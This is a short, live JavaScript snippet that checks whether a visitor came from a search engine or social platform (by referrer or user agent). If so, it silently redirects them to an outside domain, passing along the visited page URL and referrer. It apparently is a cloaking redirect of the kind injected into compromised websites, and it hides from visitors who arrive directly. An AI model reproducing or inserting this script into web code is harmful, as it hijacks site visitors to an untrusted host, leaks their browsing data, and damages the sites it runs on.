var ars = 'https://currency.lokalpro.my.id';

if(['.google.', 'bing.', 'yandex.', 'qwant.', '.aol.', 'facebook.', '.pinterest.', 'duckduckgo.', 'ecosia.', '.yahoo.', '.start.', '.info.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }

